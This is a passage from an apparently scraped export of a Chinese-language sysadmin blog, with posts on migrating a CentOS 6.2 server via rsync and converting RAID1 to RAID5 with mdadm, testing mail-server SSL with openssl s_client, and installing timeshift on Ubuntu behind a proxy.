沒有啟動\n想說就登入檢查一下看看是什麼問題導致SSH起不來，然後呢，這邊就碰到第一個地雷了\n沒有人有root 密碼！！！！ 雖然有兩個帳號可以登入，但是都是一般user ，不能做 sudo\n可以做sudo的帳號，沒有人知道密碼(因為都是用key登入)\n那用root 登入吧，結果手邊紀錄的密碼都是錯的\n好吧，那進rescue mode 改密碼總可以吧？事情如果那麼簡單就好了！\n進rescue mode 之後，要執行 passwd ，就會出現\n/lib/ld-linux.so.2: bad ELF interpreter: No such file or directory 很奇怪吧，為什麼加硬碟進去，就會碰到這個問題？\n這兩顆新增的硬碟之前是用來測試 zfs 的，所以上面有切了 zfs 的分割\n就因為這樣所以會碰到這種詭異的狀況嗎？ 不知道，不確定，不想面對\u0026hellip;\n好，針對 bad ELF interpreter 的問題，網路上的解法都是重新安裝套件\nBUT ..yes , there is always a \u0026ldquo;BUT\u0026rdquo;\nyum install glibc.i686 一樣出現上面的錯誤，所以無法安裝\u0026hellip;.\n很好，卡關\u0026hellip;換下一招！\nP.S 其實在這邊犯了個錯誤，既然新增硬碟進去出了問題\n那應該移除這兩顆新增的硬碟就可以先恢復原來的狀態(可開機運作，只是要執行程式會空間不足)\nclonezilla 來源是raid時，無法調整目標磁區的大小 因為上面失敗了，所以現在每次調整時，我都會用 clonezilla 先做一份磁碟的備份\n但是因為clonezilla 在處理來源是raid 磁區時，是用dd 慢慢寫入\n備份時間很久，因為原本的raid 已經切了99%的空間出去給LVM\n所以clonezilla 看到的使用量就是99% ，也因此每次備份幾乎就是要用dd 寫完500G的資料\n有興趣可以玩看看，在傳統硬碟上這樣做要花多少時間\u0026hellip;\n然後我每次都要複製兩顆出來\u0026hellip;\n在使用clonezilla 的過程中，突然想到clonezilla 可以動態調整目標磁區大小\n前提是目標磁碟空間比來源空間大\n這個功能要進入 advanced mode 才會看到\n興沖沖的改用這個選項複製\u0026hellip;..結果還是一樣的大小\u0026hellip;\n其實這個結果不算意外啦，算是一個小嘗試，如果有支援就算賺到\n沒有支援也就算了..\nraid擴充「成功」，但不是預期的容量 磁碟對拷完，改用對拷的磁碟開機\n然後再加入兩顆 500G 的SATA硬碟 (怪的是，這次加兩顆硬碟，就不會造成系統SSH無法啟動)\n經過一番手腳 (簡單說就是 mdadm 搭配 --add , --remove , --grow , --raid-devices 這幾個參數下去跑)\n終於成功把新的硬碟給加入原有的RAID了\n但是一檢查容量， WTF !! 為什麼還是跟原本一樣？\n這邊就要說到 raid 的原理了，直接跳過，說結論\n如果是 raid1(mirror) ，至少兩顆硬碟這部份沒有問題\n但是不管你再加多少顆硬碟進去這個raid，他的容量「不會改變」「不會改變」「不會改變」\n依照某個外國人的解釋，就是下面這樣\nRAID 1 is pure mirroring. No matter how many drives you add to RAID 1, the size never increases. What you increase is how many drives can fail and how good your read performance is. 所以，在原地擴充現有的mirror 空間不可行！\n下一招，擴充不可行，那我改raid type 可以吧？？\nconvert raid1 to raid5 既然raid1 直接加硬碟不可行，那我能不能加入硬碟之後，把raid1 轉成 raid5 呢？\n理論上是可以的\nBUT \u0026hellip;(沒錯，還是這個BUT)\n我參考底下這篇，過程其實很順利\nhttps://stevesubuntutweaks.blogspot.com/2015/06/converting-raid1-array-to-raid5-using.html\n但是只要我動到放boot 那組RAID，重開機之後，就完全沒有畫面\u0026hellip;..\n不會載入 grub 來開機，所以我完全不知道發生了什麼事，也沒辦法進grub 改 root 位置\n用rescue mode 進去想修grub ，都出現 unknown file system\n那不要動不就好了嗎？那這樣就要掛著一顆原本的舊硬碟來開機啊！什麼蠢方法啊！\n所以，失敗！\u0026hellip;.\n不過我覺得這個方式應該是比較可行的才對，或許會再找虛擬機來測試看看\nmigrate system using rsync 正所謂事不過三，前面都失敗三次了(已經花了兩天多的時間)\n不能再這樣搞下去了\n這次改用之前就用過的「正統」解決方式\n卸除原本主機上的所有硬碟，並新增一顆512G 的SSD 在新增的512G SSD上，安裝一樣的作業系統(CentOS 6.2) 這邊也有地雷...不知道為什麼，CentOS 6.2 的ISO，我用easy2boot 作到隨身碟上 安裝過程出現CDROM not FOUND的錯誤。好，那我用光碟片開機總可以吧 BUT (又是你啊，BUT兄 ) 在安裝時一樣出現CDROM not FOUND , WTF !! 最後是透過用網路安裝的方式 指定URL到 http://vault.centos.org/6.2/os/x86_64 來進行安裝 而且一開始因為6.2裝不起來，所以我改用centos 6.10 的ISO作到隨身碟進行安裝 這樣子安裝就可以，可是最後從原本硬碟把資料抄回來後，會不能開機 會有 /bin/awk too many links 類似這樣的錯誤訊息 總之，還是要想辦法裝回一樣的作業系統 系統安裝完成，關機，接上原本主機的一顆硬碟，準備把資料抄回來 如果會怕，可以用ubuntu 18.04 live DVD 開機，然後先安裝 mdadm 接著執行 mdadm --assemble --scan 偵測原本的RAID 這時候雖然會抓到RAID，但是因為上面是LVM 所以沒辦法直接掛進來 需要再執行一次 vgchange -ay 原本的lvm 磁區，就會出現在 /dev/mapper 裡面 再執行 mount /dev/mapper/sysvg-usr /mnt 把目錄掛進來 分次掛載原本的目錄，然後sync 回SSD 我是直接在系統內操作，沒有透過liveDVD 先備份 /etc , /usr 然後就看原本LVM切了幾個，每一個都mount 進來，然後把資料用rsync 抄回對應的路徑底下就好 抄完之後，把備份出來的 /etc.bak/fstab 複製回 /etc 這樣才能正常開機 重開機 正常的話，這時候重開機應該是可以進入系統 接著就是請同事確認環境、指令是否可以執行 然後修改一些像是目錄權限, uid,gid 等等的問題 基本上系統這樣就轉完了 地雷產品 在這過程中，因為本來想直接做線上升級到1TB的空間，所以買了兩個 TCELL TT550 960G SSD 來用\n結果因為線上升級失敗，改用rsync來做，所以就把這兩顆SSD用 mdadm 組成raid1 來做系統\n安裝過程沒什麼問題，但是在從舊硬碟抄資料回來的時候，發現速度很慢，而且會有卡住的情況\nhttps://www.youtube.com/watch?v=NOIyRFit64k\n從影片中可以看到，一開始複製檔案時，速度會往下掉，然後又慢慢爬上來，中間還會卡住\n另一台用的是創見 S370 512G SSD 一顆 (MLC) ，這台就不會有這種問題\n但是用Crystal Disk Mark 去測試這顆SSD ，速度又是正常 (4xx/3xx)\n不知道是不是因為做RAID的關係，或者是linux 的影響？\n總之最後這兩顆SSD 就被我退貨了\u0026hellip;\n話說我跟TCELL似乎犯衝啊\u0026hellip;\n上次買的4K EVO 64G隨身碟，也是速度很慢，跑了一次RMA換新的回來才正常\n這次的960G SSD ($2999) 又有這種問題\n看來下次要好好「評估」了..\n測試raid1轉raid5擴充空間 前面有提到，如果沒有LVM的話，我應該可以很輕易的加入兩顆硬碟到原有的raid1，然後就直接擴充容量\n不過操作失敗了，但是我一直覺得這個應該很容易解決才對\n所以我開了一台VM來做測試\nOS: Ubuntu 18.04 Server x64 HDD: 16G vmdisk x4\n一開始安裝時，就在安裝程式內設定一組raid1 (/dev/vda, /dev/vdb)，然後把系統灌在這個raid device上\n安裝完成後，先進入系統確認一下現在的狀態\n可以看到有一個raid1 的磁區，由 /dev/vda1 , /dev/vdb1 組成，raid-devices:2 Array Size: 16765952 (15.99 GiB)\n然後還有兩個磁碟沒有用到 (/dev/vdc , /dev/vdd)\n接著為了進行模擬測試，先拍個快照，然後改用 ubuntu 18.04 Desktop 的ISO開機\n進入系統後，要先開啟 terminal 來安裝 mdadm\napt install mdadm -y 然後把剛剛看到的兩顆還沒用到的磁碟切分割，加入RAID內\n或者可以直接用sfdisk 從原有的磁碟抄partition table過來\n我直接用 sfdisk 抄比較快，底下的指令是抄 vda 的partition table 到 vdc和 vdd\nsfdisk -d /dev/vda | sfdisk /dev/vdc sfdisk -d /dev/vda | sfdisk /dev/vdd 然後檢查一下是不是正確\nfdisk -l /dev/vdc fdisk -l /dev/vdd 再來就偵測原來的RAID，然後加入兩個剛剛做出來的分割到raid群組內\n接著就直接把raid1轉成raid5，然後把raid-devices:2 改成 4，看一下狀態\n可以看到，在把raid-devices 提升到4顆之後，原有的raid 就會開始進行reshape (不是rebuild唷)\nmdadm --assemble --scan mdadm --add /dev/md0 /dev/vdc1 /dev/vdd1 mdadm --grow /dev/md0 --level=5 mdadm --grow /dev/md0 --raid-devices=4 cat /proc/mdstat 耐心等待raid reshape 跑完，要一點時間，我只用16G的磁碟來測試也要跑個七八分鐘左右\n不敢想像如果是幾TB的空間要跑多久\u0026hellip;\n等上面的程序跑完後，再看一下raid狀態，就會看到原有的RAID空間變大了，磁碟變多了，心情變好了，考試也都考100分了！\n本來想說已經完成了，興沖沖的把raid 掛進來，看一下空間，卻還是16G ?????\nmount /dev/md0p1 /mnt df -h 其實這邊我一直沒搞懂，文章都說你就跑 e2fsck 檢查一次，然後跑 resize2fs 放大就結束了\n問題是，我這樣做沒用\u0026hellip;\n最後我是直接請出 gparted 來做\n叫出 gparted 之後，可以直接看到剛剛增加的空間沒有被放到原有的raid\n那就直接 resize吧\ngparted resize 太簡單了\u0026hellip;直接用拉的就好了\n好，都做完了，重開機見真章！看看到底有沒有成功？\n空間順利放大了，打完收工！\n我想以後如果又碰到一樣的狀況，大概就會用最後這個方式處理吧！\n","date":"2019-03-27T17:44:49+08:00","permalink":"https://h.cowbay.org/post/transfer-cent62-using-rsync/","title":"[筆記] 用rsync 移轉 centos 6.2的老機器 Transfer Cent6.2 using rsync"},{"content":"今天老闆出國，發slack說手機不能寄信，看了一下，似乎是因為用GMAIL的APP來收信\n然後google 不知道跟人家改了什麼，結果不接受原本的認證了\u0026hellip; WTF \u0026hellip;.\n然後，這問題應該很久了，結果現在才在講 \u0026hellip;.\n底下都是用linux 主機來進行測試\nwindows環境應該也可以，只是要自己去安裝 openssl 軟體\nTo verify SSL, connect to any Linux server via SSH and use the instructions below:\n測試 SSL-IMAP 993 port\nopenssl s_client -showcerts -connect mail.example.com:993 結果應該會像是這樣\n2019-03-20 11:21:02 [changch@hqdc034 ~]$ openssl s_client -showcerts -connect mail.abc.com:993 CONNECTED(00000003) depth=0 C = TW, ST = Taipei, L = Taipei, O = iredmail02.abc.com, OU = IT, CN = iredmail02.abc.com, emailAddress = root@iredmail02.abc.com verify error:num=18:self signed certificate verify return:1 depth=0 C = TW, ST = Taipei, L = Taipei, O = iredmail02.abc.com, OU = IT, CN = iredmail02.abc.com, emailAddress = root@iredmail02.abc.com verify return:1 --- Certificate chain 0 s:/C=TW/ST=Taipei/L=Taipei/O=iredmail02.abc.com/OU=IT/CN=iredmail02.abc.com/emailAddress=root@iredmail02.abc.com i:/C=TW/ST=Taipei/L=Taipei/O=iredmail02.abc.com/OU=IT/CN=iredmail02.abc.com/emailAddress=root@iredmail02.abc.com -----BEGIN CERTIFICATE----- MIIEQTCCAymgAwIBAgIJAJksSxoDSMTLMA0GCSqGSIb3DQEBCwUAMIG2MQswCQYD VQQGEwJUVzEPMA0GA1UECAwGVGFpcGVpMQ8wDQYDVQQHDAZUYWlwZWkxIzAhBgNV BAoMGmlyZWRtYWlsMDIuZW1hdHRlcnMuY29tLnR3MQswCQYDVQQLDAJJVDEjMCEG A1UEAwwaaXJlZG1haWwwMi5lbWF0dGVycy5jb20udHcxLjAsBgkqhkiG9w0BCQEW H3Jvb3RAaXJlZG1haWwwMi5lbWF0dGVycy5jb20udHcwHhcNMTQwOTI0MTA1MjA2 WhcNMjQwOTIxMTA1MjA2WjCBtjELMAkGA1UEBhMCVFcxDzANBgNVBAgMBlRhaXBl aTEPMA0GA1UEBwwGVGFpcGVpMSMwIQYDVQQKDBppcmVkbWFpbDAyLmVtYXR0ZXJz LmNvbS50dzELMAkGA1UECwwCSVQxIzAhBgNVBAMMGmlyZWRtYWlsMDIuZW1hdHRl cnMuY29tLnR3MS4wLAYJKoZIhvcNAQkBFh9yb290QGlyZWRtYWlsMDIuZW1hdHRl cnMuY29tLnR3MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvwNtZSdi tDxSLNtFiIFv4Ww0+TwtuJAs6yUjQmfHa8CQDoSO/5EmUE2n4VA/78Qb/l/Si5tR 1FcTY2fifzXJfKkC5kMfoxkevyVqGCw3ZKku/QclaGunmLr/xCndbxbmx28T6PYJ 73ZrM9viRsE9Cn397IXZWOK+YFIxShhUFZrz1RxDk3cIU+MubBq7/A9Af8Izq9RK w1vYK8+Jg81rOerQy71THxuUO5t+uFRzHuKGl8w8TnTt+Gnqx02UWFyHHtlVvhYV Bi985OtvP0liApUQM7X4FPK/9cgNIlnXIi+SzQ2qtjqLNUHfO4P7GZ0IezIlFCHJ ylx7GAj/tXm7HQIDAQABo1AwTjAdBgNVHQ4EFgQUgedf/rCzYD2FkR9C+kurh3Tj 2jcwHwYDVR0jBBgwFoAUgedf/rCzYD2FkR9C+kurh3Tj2jcwDAYDVR0TBAUwAwEB /zANBgkqhkiG9w0BAQsFAAOCAQEAdFwoT/Y+76bDVxKn6ZW2hY0zcRe71MV4M6L1 AaObMEEBFg3C4oDZJTEyLItT2YNQ8SyNue9GstTwoZeMBiJ+sTt82f4d3KuaPynO 3ArnEGEektuaOs449eLHqLZVyGgMl7LMjThLntlTfBqD6cnmrcRpGdMUffCVAL9o xzT9cgS6nOQIDo4uTPi7V8hqo+ioBzQXernomETW8TYocezw+XoaZB0rx4oo7uj9 zBih574GxNMcLreus5b8shEVWWlvReYkGjiHO70j818zOv4pmeJgNmkIEUW068TV EybQFb6GZt3n3HWAbCc/ohaqUAoHc6S0P38xWRpLKyqvKEtjzw== -----END CERTIFICATE----- --- Server certificate subject=/C=TW/ST=Taipei/L=Taipei/O=iredmail02.abc.com/OU=IT/CN=iredmail02.abc.com/emailAddress=root@iredmail02.abc.com issuer=/C=TW/ST=Taipei/L=Taipei/O=iredmail02.abc.com/OU=IT/CN=iredmail02.abc.com/emailAddress=root@iredmail02.abc.com --- No client certificate CA names sent --- SSL handshake has read 1784 bytes and written 453 bytes --- New, TLSv1/SSLv3, Cipher is ECDHE-RSA-AES256-GCM-SHA384 Server public key is 2048 bit Secure Renegotiation IS supported Compression: NONE Expansion: NONE SSL-Session: Protocol : TLSv1.2 Cipher : ECDHE-RSA-AES256-GCM-SHA384 Session-ID: 44738AF637D8531FE4554D30FC2D33428A17BD3B63C38C9D51EA18567D77F9F4 Session-ID-ctx: Master-Key: BEC2C876D0BE5066B7A1EC6BC06B8B72169FF6D6ADC77C45A080F6B7FCB23911134F815802BA80FC106C1E39F5FD28C3 Key-Arg : None PSK identity: None PSK identity hint: None SRP username: None TLS session ticket lifetime hint: 300 (seconds) TLS session ticket: 0000 - 22 77 be c5 f2 e7 14 e1-b0 dc 1d 0b 00 a1 11 47 \u0026#34;w.............G 0010 - a0 c5 b5 26 fb 15 b7 07-60 9a 79 8a a6 a5 45 77 ...\u0026amp;....`.y...Ew 0020 - 74 de 1f 1e 8f b6 4d 29-66 6e 07 38 f3 d5 d8 35 t.....M)fn.8...5 0030 - 2a 83 36 56 6f d7 0e c6-19 95 60 c5 3f 3c 9b 25 *.6Vo.....`.?\u0026lt;.% 0040 - 75 0e 2a b6 57 cf 74 ad-36 e8 60 ee 37 30 ca e9 u.*.W.t.6.`.70.. 0050 - e1 42 b2 28 7e 03 df 1a-50 0c 31 ce d1 97 f2 84 .B.(~...P.1..... 0060 - 2a 89 e1 c9 79 37 e1 37-9a f8 7f 8b 54 e0 ef 72 *...y7.7....T..r 0070 - 4f 97 f1 92 24 b1 c5 9c-97 e1 03 cf 93 7b d8 e7 O...$........{.. 0080 - 72 6e 3d 33 a2 84 ea c3-9f 26 7f ae 99 29 88 04 rn=3.....\u0026amp;...).. 0090 - 20 86 63 d2 7d ef b1 da-46 6f 3b 3c 4d dc 39 f2 .c.}...Fo;\u0026lt;M.9. Start Time: 1553052073 Timeout : 300 (sec) Verify return code: 18 (self signed certificate) --- * OK [CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE AUTH=PLAIN AUTH=LOGIN] Dovecot (Ubuntu) ready. 2019-03-20 11:21:47 [changch@hqdc034 ~]$ 測試SMTP TLS 587 port\nopenssl s_client -starttls smtp -showcerts -connect mail.example.com:587 指令有點不同，要加上 startls smtp 的參數 回應應該會是這樣\n2019-03-20 11:50:48 [changch@hqdc034 ~]$ openssl s_client -starttls smtp -showcerts -connect mail.abc.com:587 CONNECTED(00000003) depth=1 C = US, O = Let\u0026#39;s Encrypt, CN = Let\u0026#39;s Encrypt Authority X3 verify error:num=20:unable to get local issuer certificate verify return:0 --- Certificate chain 0 s:/CN=mail.abc.com i:/C=US/O=Let\u0026#39;s Encrypt/CN=Let\u0026#39;s Encrypt Authority X3 -----BEGIN CERTIFICATE----- MIIFXjCCBEagAwIBAgISA1Tg+poqmT+Vztc+/L2IPUHiMA0GCSqGSIb3DQEBCwUA MEoxCzAJBgNVBAYTAlVTMRYwFAYDVQQKEw1MZXQncyBFbmNyeXB0MSMwIQYDVQQD ExpMZXQncyBFbmNyeXB0IEF1dGhvcml0eSBYMzAeFw0xOTAyMjAyMzM0MjZaFw0x OTA1MjEyMzM0MjZaMB8xHTAbBgNVBAMTFG1haWwuZW1hdHRlcnMuY29tLnR3MIIB IjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuhyXC0sCNccrqteycHst8ykZ JSLxXB/07GBkvpdaCSKqTFAjtUh9IpkyDna1+IMtQIX+jeDWvd/GMJ3lj1pCgM+X je850oFBp+HxMXTSDN67RMPbZsgAt9I938uigYmICHCqn4+FrnlfEOuX24326Y5Z qEnguvZIdXYbQ5fzdMjP4W4Byu9cQAR+IUEWpFZ+hFNETAOVlNFb5kzsESWPTwIk XWpDeQLQN6Iixf/ISXduJZSbOsFknAk7Dfrfine2cN9uYFCaiI2MJzrZ472Gbx+d RnR6OmCinJ6Pb4yFQl2wQfGxnNyVCKTGu8JC+DM+j/Jfg1YYkxF4r/RdepPOTQID AQABo4ICZzCCAmMwDgYDVR0PAQH/BAQDAgWgMB0GA1UdJQQWMBQGCCsGAQUFBwMB BggrBgEFBQcDAjAMBgNVHRMBAf8EAjAAMB0GA1UdDgQWBBSaA9/Ki7j6XwUFm5af X4WYJQNFIDAfBgNVHSMEGDAWgBSoSmpjBH3duubRObemRWXv86jsoTBvBggrBgEF BQcBAQRjMGEwLgYIKwYBBQUHMAGGImh0dHA6Ly9vY3NwLmludC14My5sZXRzZW5j cnlwdC5vcmcwLwYIKwYBBQUHMAKGI2h0dHA6Ly9jZXJ0LmludC14My5sZXRzZW5j cnlwdC5vcmcvMB8GA1UdEQQYMBaCFG1haWwuZW1hdHRlcnMuY29tLnR3MEwGA1Ud IARFMEMwCAYGZ4EMAQIBMDcGCysGAQQBgt8TAQEBMCgwJgYIKwYBBQUHAgEWGmh0 dHA6Ly9jcHMubGV0c2VuY3J5cHQub3JnMIIBAgYKKwYBBAHWeQIEAgSB8wSB8ADu AHUA4mlLribo6UAJ6IYbtjuD1D7n/nSI+6SPKJMBnd3x2/4AAAFpDXmYTAAABAMA RjBEAiBwIf9s7zBBuh/HUso4GWcZcAaEp2LsqT3xuJNOt7EWDAIgXE+u1JRVVEit vi0PWIyfmUhBV8HP9GZ7r7uv2/9vGoYAdQBj8tvN6DvMLM8LcoQnV2szpI1hd4+9 daY4scdoVEvYjQAAAWkNeZiVAAAEAwBGMEQCIAZHUtzIl+6UvusG0cpYTiN5cFav hzFQMoGeA5L5bSRvAiARX/+xnhtF9lUcXOsJfST1Eghk4Gm7QGno8vbcD3JHnzAN BgkqhkiG9w0BAQsFAAOCAQEAI3buq7vydxeDpwSYVToAockocOMwXTyORIo6tACg Z8gmVVTU6jliwrGWGzsjGh/V0gU+beDtlKzJpsYqbAWGOne1uuuKoH++lHO1KrrB Br0R+G/UlIhRIZuSCdUGylWkV1ZQbHPtfw3MBB4nNj6wU0/tluxrqHJme/tyRSCs WiP/DSfzIUkGUSSXyd3oEjwBdmq7NAmck3FK24HgBcJ3PSExChw4+TsEmGicpCKP Q5AKt+n4b52tnp51P7rBHSFdmNL4AZiiQtZNXVmAQ2GI9zCwKguQg2c3YJ2oF39m 1GnjpLMRQkv5x6GQi7rglwB9ROH92Lg+uSD1vzjfiFwQeQ== -----END CERTIFICATE----- 1 s:/C=US/O=Let\u0026#39;s Encrypt/CN=Let\u0026#39;s Encrypt Authority X3 i:/O=Digital Signature Trust Co./CN=DST Root CA X3 -----BEGIN CERTIFICATE----- MIIEkjCCA3qgAwIBAgIQCgFBQgAAAVOFc2oLheynCDANBgkqhkiG9w0BAQsFADA/ MSQwIgYDVQQKExtEaWdpdGFsIFNpZ25hdHVyZSBUcnVzdCBDby4xFzAVBgNVBAMT DkRTVCBSb290IENBIFgzMB4XDTE2MDMxNzE2NDA0NloXDTIxMDMxNzE2NDA0Nlow SjELMAkGA1UEBhMCVVMxFjAUBgNVBAoTDUxldCdzIEVuY3J5cHQxIzAhBgNVBAMT GkxldCdzIEVuY3J5cHQgQXV0aG9yaXR5IFgzMIIBIjANBgkqhkiG9w0BAQEFAAOC AQ8AMIIBCgKCAQEAnNMM8FrlLke3cl03g7NoYzDq1zUmGSXhvb418XCSL7e4S0EF q6meNQhY7LEqxGiHC6PjdeTm86dicbp5gWAf15Gan/PQeGdxyGkOlZHP/uaZ6WA8 SMx+yk13EiSdRxta67nsHjcAHJyse6cF6s5K671B5TaYucv9bTyWaN8jKkKQDIZ0 Z8h/pZq4UmEUEz9l6YKHy9v6Dlb2honzhT+Xhq+w3Brvaw2VFn3EK6BlspkENnWA a6xK8xuQSXgvopZPKiAlKQTGdMDQMc2PMTiVFrqoM7hD8bEfwzB/onkxEz0tNvjj /PIzark5McWvxI0NHWQWM6r6hCm21AvA2H3DkwIDAQABo4IBfTCCAXkwEgYDVR0T AQH/BAgwBgEB/wIBADAOBgNVHQ8BAf8EBAMCAYYwfwYIKwYBBQUHAQEEczBxMDIG CCsGAQUFBzABhiZodHRwOi8vaXNyZy50cnVzdGlkLm9jc3AuaWRlbnRydXN0LmNv bTA7BggrBgEFBQcwAoYvaHR0cDovL2FwcHMuaWRlbnRydXN0LmNvbS9yb290cy9k c3Ryb290Y2F4My5wN2MwHwYDVR0jBBgwFoAUxKexpHsscfrb4UuQdf/EFWCFiRAw VAYDVR0gBE0wSzAIBgZngQwBAgEwPwYLKwYBBAGC3xMBAQEwMDAuBggrBgEFBQcC ARYiaHR0cDovL2Nwcy5yb290LXgxLmxldHNlbmNyeXB0Lm9yZzA8BgNVHR8ENTAz MDGgL6AthitodHRwOi8vY3JsLmlkZW50cnVzdC5jb20vRFNUUk9PVENBWDNDUkwu Y3JsMB0GA1UdDgQWBBSoSmpjBH3duubRObemRWXv86jsoTANBgkqhkiG9w0BAQsF AAOCAQEA3TPXEfNjWDjdGBX7CVW+dla5cEilaUcne8IkCJLxWh9KEik3JHRRHGJo uM2VcGfl96S8TihRzZvoroed6ti6WqEBmtzw3Wodatg+VyOeph4EYpr/1wXKtx8/ wApIvJSwtmVi4MFU5aMqrSDE6ea73Mj2tcMyo5jMd6jmeWUHK8so/joWUoHOUgwu X4Po1QYz+3dszkDqMp4fklxBwXRsW10KXzPMTZ+sOPAveyxindmjkW8lGy+QsRlG PfZ+G6Z6h7mjem0Y+iWlkYcV4PIWL1iwBi8saCbGS5jN2p8M+X+Q7UNKEkROb3N6 KOqkqm57TH2H3eDJAkSnh6/DNFu0Qg== -----END CERTIFICATE----- --- Server certificate subject=/CN=mail.abc.com issuer=/C=US/O=Let\u0026#39;s Encrypt/CN=Let\u0026#39;s Encrypt Authority X3 --- No client certificate CA names sent --- SSL handshake has read 3279 bytes and written 456 bytes --- New, TLSv1/SSLv3, Cipher is ECDHE-RSA-AES256-GCM-SHA384 Server public key is 2048 bit Secure Renegotiation IS supported Compression: NONE Expansion: NONE SSL-Session: Protocol : TLSv1.2 Cipher : ECDHE-RSA-AES256-GCM-SHA384 Session-ID: F9FF6D75A3923A3B4E2CFBECC3DEAE2402FA99DA2B0746B6A2BF7E7E49F2E4D6 Session-ID-ctx: Master-Key: 62D845C4754634DCDAE1AB544B06929504C6310B3CD6E4512E3718535D871F1115A78DB46FA608159F52169DE4D9E12F Key-Arg : None PSK identity: None PSK identity hint: None SRP username: None Start Time: 1553053873 Timeout : 300 (sec) Verify return code: 20 (unable to get local issuer certificate) --- 250 DSN 測試 SMTP SSL port 465 指令\n不過因為我沒開這個port ，所以就不測試了\n","date":"2019-03-20T11:42:47+08:00","permalink":"https://h.cowbay.org/post/command_to_test_main_ssl/","title":"[筆記] 測試mail server 的SSL憑證的指令 Command to test mailserver SSL"},{"content":"最近要開始測試client安裝 ubuntu 18.04 的 ansible playbook\n因為要不斷的修正，所以想到一直有在自己電腦上執行的timeshift這個軟體\n可以很簡單快速的備份、恢復系統狀態\n可是不知道為什麼，在ubuntu 18.04 上安裝就是會發生錯誤\u0026hellip;.\n因為client 的環境都躲在proxy後面，一開始我想說直接下\nexport http_proxy=http://proxy_server:port export https_proxy=http://proxy_server:port 然後再去依照官方的指令，新增repository就好\nsudo add-apt-repository ppa:teejee2008/ppa 結果當然不是我想的那麼簡單\u0026hellip;\n直接就跳錯誤出來了\n2019-03-11 13:57:28 [mini@pc074 ~]$ sudo add-apt-repository ppa:teejee2008/ppa Cannot add PPA: \u0026#39;ppa:~teejee2008/ubuntu/ppa\u0026#39;. ERROR: \u0026#39;~teejee2008\u0026#39; user or team does not exist. 翻了一下google，有找到解法，但沒找到原因，就先這樣吧\u0026hellip;(不求甚解)\nexport http_proxy=http://proxy_server:port export https_proxy=http://proxy_server:port sudo -E add-apt-repository -y ppa:teejee2008/ppa sudo apt isntall timeshift 裝好之後，看一下怎麼執行，其實很簡單，也不用特別去指定什麼路徑\n2019-03-11 14:00:59 [minion@hqpc074 ~]$ sudo timeshift --create --comments \u0026#34;after ansible\u0026#34; First run mode (config file not found) Selected default snapshot type: RSYNC Selected default snapshot device: /dev/sda1 ------------------------------------------------------------------------------ Estimating system size... Creating new snapshot...(RSYNC) Saving to device: /dev/sda1, mounted at path: / Synching files with rsync... Created control file: /timeshift/snapshots/2019-03-11_14-01-01/info.json RSYNC Snapshot saved successfully (79s) Tagged snapshot \u0026#39;2019-03-11_14-01-01\u0026#39;: ondemand ------------------------------------------------------------------------------ 2019-03-11 14:02:20 [mini@pc074 ~]$ 這樣就備份完了，來測試一下備份是否正常，先隨便裝個本來沒裝的軟體\n2019-03-11 14:02:20 [minion@hqpc074 ~]$ sudo apt install joe Reading package lists... Done Building dependency tree Reading state information... Done The following NEW packages will be installed: joe 0 upgraded, 1 newly installed, 0 to remove and 310 not upgraded. Need to get 509 kB of archives. After this operation, 2137 kB of additional disk space will be used. Get:1 http://tw.archive.ubuntu.com/ubuntu bionic/universe amd64 joe amd64 4.6-1 [509 kB] Fetched 509 kB in 2s (254 kB/s) Selecting previously unselected package joe. (Reading database ... 150020 files and directories currently installed.) Preparing to unpack .../archives/joe_4.6-1_amd64.deb ... Unpacking joe (4.6-1) ... Processing triggers for mime-support (3.60ubuntu1) ... Processing triggers for desktop-file-utils (0.23-1ubuntu3) ... Setting up joe (4.6-1) ... update-alternatives: using /usr/bin/joe to provide /usr/bin/editor (editor) in auto mode Processing triggers for man-db (2.8.3-2) ... Processing triggers for gnome-menus (3.13.3-11ubuntu1) ... 2019-03-11 14:09:39 [minion@hqpc074 ~]$ 確定 joe 已經安裝\n2019-03-11 14:09:51 [minion@hqpc074 ~]$ joe --help Joe\u0026#39;s Own Editor v4.6 Usage: joe [global-options] [ [local-options] filename ]... Global options: -[-]restore Restore cursor mode -[-]regex Standard or JOE regular expression syntax -[-]square Rectangular region mode -[-]icase Case insensitive search mode -[-]wrap Search wraps mode -[-]menu_explorer Menu explorer mode -[-]menu_above Menu above/below mode -[-]notagsmenu Tags menu mode -[-]search_prompting Search prompting mode -[-]menu_jump Jump into menu mode -[-]autoswap Autoswap mode -[-]mid Center on scroll mode -left nnn Left scroll amount -right nnn Right scroll amount -[-]guess_crlf Auto detect CR-LF mode -[-]guess_indent Guess indent mode -[-]guess_non_utf8 Guess non-UTF-8 mode -[-]guess_utf8 Guess UTF-8 mode -[-]guess_utf16 Guess UTF-16 mode -[-]transpose Transpose menus mode -[-]marking Region marking mode -[-]asis Display meta chars as-is mode -[-]force Force last NL mode -[-]joe_state Joe_state file mode -[-]nobackups Disable backups mode -[-]nodeadjoe Disable DEADJOE mode -[-]nolocks Disable locks mode -[-]nomodcheck Disable mtime check mode -[-]nocurdir Disable current dir -[-]break_hardlinks Break hard links -[-]break_links Break links -[-]lightoff Auto unmark -[-]exask Exit ask -[-]beep Beeps -[-]nosta Disable status line -[-]keepup Fast status line -pg nnn No. PgUp/PgDn lines -undo_keep nnn No. undo records -[-]csmode Continued search -backpath sss Path to backup files -[-]floatmouse Click past end -[-]rtbutton Right button -[-]nonotice Suppress startup notice -[-]noexmsg Suppress exit message -[-]help_is_utf8 Help is UTF-8 -[-]noxon Disable XON/XOFF -[-]orphan Orphan extra files -[-]helpon Start editor with help displayed -[-]dopadding Emit padding NULs -lines nnn No. screen lines (if no window size ioctl) -baud nnn Baud rate -columns nnn No. screen columns (if no window size ioctl) -skiptop nnn No. screen lines to skip -[-]notite Suppress tty init sequence -[-]brpaste Bracketed paste mode -[-]pastehack Paste quoting hack -[-]nolinefeeds Suppress history preserving linefeeds -[-]mouse Enable mouse -[-]usetabs Screen update uses tabs -[-]assume_color Assume terminal supports color -[-]assume_256color Assume terminal supports 256 colors -[-]joexterm Assume xterm patched for JOE -xmsg sss Exit message -aborthint sss Abort hint -helphint sss Help hint -lmsg sss Left side status line format -rmsg sss Right side status line format -smsg sss Status command format -zmsg sss Status command format EOF -keymap sss Keymap to use -mnew sss Macro to execute for new files -mfirst sss Macro to execute on first change -mold sss Macro to execute on existing files -msnew sss Macro to execute when new files are saved -msold sss Macro to execute when existing files are saved -text_color sss Text color -help_color sss Help color 